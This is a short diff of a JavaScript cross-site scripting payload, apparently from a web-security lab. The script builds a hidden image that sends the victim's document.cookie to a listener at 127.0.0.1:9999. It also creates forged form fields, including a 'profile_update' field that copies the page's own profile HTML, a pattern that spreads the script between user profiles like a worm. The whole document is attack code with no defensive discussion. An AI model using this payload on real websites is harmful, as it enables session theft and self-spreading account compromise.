@@ -1,7 +1,7 @@
 <script>
   var img=new Image();
   img.src="http://127.0.0.1:9999?cookies="+document.cookie;
-  img.style="display:none";
+  img.style.display="none";
   document.getElementsByTagName("a")[0].appendChild(img);
 </script>
 
@@ -19,7 +19,7 @@
   var i1 = document.createElement("input");
   i1.type="text";
   i1.name="recipient";
-  i1.value="a";
+  i1.value="xss";
  
   var i2 = document.createElement("input");
   i2.type="text";
@@ -54,7 +54,7 @@
 
   var t=document.createElement("textarea");
   t.name="profile_update";
-  t.value="haha";
+  t.value=document.getElementById("profile").innerHTML;
   f2.appendChild(t);
 
   var i=document.createElement("input");
